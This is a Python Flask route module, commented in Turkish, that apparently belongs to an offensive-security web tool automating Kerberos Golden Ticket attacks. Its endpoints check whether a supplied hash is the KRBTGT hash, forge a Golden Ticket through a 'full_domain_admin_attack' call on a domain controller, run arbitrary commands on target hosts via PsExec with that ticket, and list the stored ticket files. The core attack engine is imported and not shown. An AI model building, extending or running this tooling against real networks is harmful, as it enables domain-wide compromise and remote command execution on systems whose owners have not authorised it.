"""
Golden Ticket Route Module
Golden Ticket otomasyonu için Flask route'ları.
"""
from flask import Blueprint, render_template, request, jsonify, redirect, session

from cybermodules.golden_ticket import GoldenTicketEngine as GoldenTicketAutomation

golden_bp = Blueprint("golden", __name__)


@golden_bp.route("/golden")
def golden_dashboard():
    """Golden Ticket ana sayfası"""
    if not session.get("logged_in"):
        return redirect("/login")
    return render_template("golden.html")


@golden_bp.route("/golden/analyze-hash", methods=["POST"])
def analyze_hash():
    """Hash'in KRBTGT olup olmadığını analiz et"""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    data = request.get_json()
    hash_str = data.get("hash", "")
    
    if not hash_str:
        return jsonify({
            "success": False,
            "message": "Hash gerekli",
            "is_krbtgt": False
        })
    
    gta = GoldenTicketAutomation()
    is_krbtgt = gta.is_krbtgt_hash(hash_str)
    
    return jsonify({
        "success": True,
        "is_krbtgt": is_krbtgt,
        "message": "KRBTGT hash tespit edildi!" if is_krbtgt else "Bu hash KRBTGT değil",
        "recommendation": "Hashdump sonuçlarını kontrol edin" if not is_krbtgt else "Golden Ticket oluşturabilirsiniz"
    })


@golden_bp.route("/golden/forge", methods=["POST"])
def forge_ticket():
    """
    Tam Golden Ticket saldırısı gerçekleştirir.
    
    Frontend'den gelen istek:
    {
        "hash": "krbtgt_hash",
        "domain": "corp.local",
        "dc_ip": "192.168.1.10",
        "domain_sid": "S-1-5-21-..."
    }
    
    Frontend'e dönen yanıt:
    {
        "success": true/false,
        "logs": [...],
        "steps": {
            "is_krbtgt": true/false,
            "ticket_forged": true/false,
            "psexec_success": true/false
        },
        "ticket_path": "...",
        "message": "...",
        "ticket_created": true/false
    }
    """
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    data = request.get_json()
    hash_str = data.get("hash", "")
    domain = data.get("domain", "")
    dc_ip = data.get("dc_ip", "")
    domain_sid = data.get("domain_sid", "")
    
    if not hash_str or not domain:
        return jsonify({
            "success": False,
            "message": "Hash ve Domain gerekli",
            "logs": ["[-] Hata: Hash ve Domain parametreleri zorunludur"],
            "steps": {
                "is_krbtgt": False,
                "ticket_forged": False,
                "psexec_success": False
            }
        })
    
    gta = GoldenTicketAutomation()
    
    # Tam saldırı gerçekleştir
    result = gta.full_domain_admin_attack(
        krbtgt_hash=hash_str,
        domain=domain,
        dc_ip=dc_ip or domain,
        domain_sid=domain_sid or None
    )
    
    # Frontend'in beklediği formata dönüştür
    response = {
        "success": result.get("success", False),
        "logs": result.get("logs", []),
        "steps": result.get("steps", {
            "is_krbtgt": False,
            "ticket_forged": False,
            "psexec_success": False
        }),
        "ticket_path": result.get("ticket_path", ""),
        "ticket_created": result.get("steps", {}).get("ticket_forged", False),
        "message": result.get("message", "Bilinmeyen hata")
    }
    
    return jsonify(response)


@golden_bp.route("/golden/execute", methods=["POST"])
def execute_with_ticket():
    """Ticket ile komut çalıştır"""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    data = request.get_json()
    target = data.get("target", "")
    command = data.get("command", "whoami")
    ticket_path = data.get("ticket_path", "/tmp/krbtgt.ccache")
    
    if not target:
        return jsonify({
            "success": False,
            "message": "Target gerekli",
            "logs": ["[-] Hata: Hedef IP/hostname belirtilmeli"]
        })
    
    gta = GoldenTicketAutomation()
    result = gta.execute_psexec(target, ticket_path, command)
    
    return jsonify({
        "success": result.get("success", False),
        "output": result.get("output", ""),
        "error": result.get("error", ""),
        "logs": result.get("logs", [])
    })


@golden_bp.route("/golden/ticket-info", methods=["GET"])
def ticket_info():
    """Oluşturulan ticket hakkında bilgi döndürür"""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    import os
    import glob
    
    temp_dir = "/tmp/monolith_golden"
    tickets = []
    
    if os.path.exists(temp_dir):
        for f in glob.glob(os.path.join(temp_dir, "*.ccache")):
            tickets.append({
                "path": f,
                "size": os.path.getsize(f),
                "modified": os.path.getmtime(f)
            })
    
    return jsonify({
        "success": True,
        "tickets": tickets
    })
